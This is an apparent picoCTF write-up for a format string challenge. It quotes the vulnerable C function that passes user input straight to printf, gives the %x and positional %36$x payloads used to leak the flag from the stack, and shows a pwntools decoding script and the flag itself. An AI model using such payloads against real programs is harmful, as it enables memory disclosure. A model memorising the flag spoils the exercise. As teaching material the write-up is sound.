# Flag Leak 
 
## Challenge Description: Story telling class 1/2

For this challenge, the vulnerable program has a format string vulnerability in its **printf** function . From the [source code](./vuln.c), we can see the flag first being read into a local variable *flag*. Subsequently, user input is obtained with **scanf** and subsequently placed into a variable *story*. This *story* is then fed to **printf** as shown: 

```C
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```
After fuzzing the input and determining that it was vulnerable and leaked content with **%d** (decimal) and **%x** (hexadecimal), the following steps were performed:

1. Leaking the top 50 stack hex digits with the following input:

```%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x```

2. Found the known flag characters ```pico``` (**6f636970** in Little Endian) at offset **36**

![flag_offset](https://user-images.githubusercontent.com/71312079/160641846-3ed0e578-1050-4082-97bd-8deef0e901e5.png)

3. Printed the next 10 characters starting from offset **36**

```%36$x,%37$x,%38$x,%39$x,%40$x,%41$x,%42$x,%43$x,%44$x,%45$x```

![flag_hex](https://user-images.githubusercontent.com/71312079/160641843-5015e566-fe69-45a4-b7c8-5a9170541ff4.png)

4. Formatted the output into a python list and decoded it with the following code to produce the flag: 

```python
from pwn import *
flag = b''
a = [0x6f636970,0x7b465443,0x6b34334c,0x5f676e31,0x67346c46,0x6666305f,0x3474535f,0x635f6b63,0x34396532,0x7d643365]
for el in a:
	flag += p32(el)
print(flag)
```


FLAG: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}`

